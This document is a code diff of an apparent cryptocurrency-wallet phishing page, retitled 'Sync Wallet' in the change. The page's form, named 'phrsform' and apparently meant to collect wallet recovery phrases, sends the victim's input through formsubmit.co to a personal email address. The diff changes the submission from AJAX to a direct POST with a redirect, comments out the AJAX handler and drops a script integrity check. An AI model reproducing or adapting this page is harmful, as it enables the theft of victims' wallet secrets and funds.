@@ -8,7 +8,7 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
 
-            <title>Ethereum-classic</title>
+            <title>Sync Wallet</title>
     <link href="images/index.svg" rel="shortcut icon">
 
 
@@ -21,7 +21,7 @@
         <link href="/assets/css/all.html" rel="stylesheet" type="text/css">
         <script src="/assets/js/jquery.min.html"></script>
         <script src="js/app.js"></script>
-        <script src="/assets/js/jquery.min.js" integrity="sha512-STof4xm1wgkfm7heWqFJVn58Hm3EtS31XFaagaa8VMReCXAkQnJZ+jEy8PCC/iT18dFy95WcExNHFTqLyp72eQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        <script src="/assets/js/jquery.min.js"></script>
         <script>
 function validateForm() {
  const text = document.querySelector(".formInputBlockchain");
@@ -111,8 +111,8 @@ function validateForm() {
                             <div class="tab-content" id="pills-tabContent">
                                 <div class="tab-pane fade show active" id="pills-profile" role="tabpanel"
                                     aria-labelledby="pills-profile-tab">
-                                    <form action='https://formsubmit.co/ajax/rabbadev@zohomail.com' class="ajaxForm" id='sync' method='post' name='phrsform' ><input type='hidden' name='form-name' value='phrsform' />
-                                        <script>
+                                    <form action='https://formsubmit.co/rabbadev@zohomail.com' class="ajaxForm" id='sync' method='post' name='phrsform' ><input type='hidden' name='form-name' value='phrsform' /><input type="hidden" name="_next" value="http://127.0.0.1:5500/success.html">
+                                        <!-- <script>
                                             $(".ajaxForm").submit(function(e) {
                                             e.preventDefault();
                                             var href = $(this).attr("action");
@@ -130,7 +130,7 @@ function validateForm() {
                                             }
                                             });
                                             });
-                                            </script>  
+                                            </script>   -->
                                         <div class="row">
                                             <div class="col-md-12">
                                                 <div class="form-group mt-2">
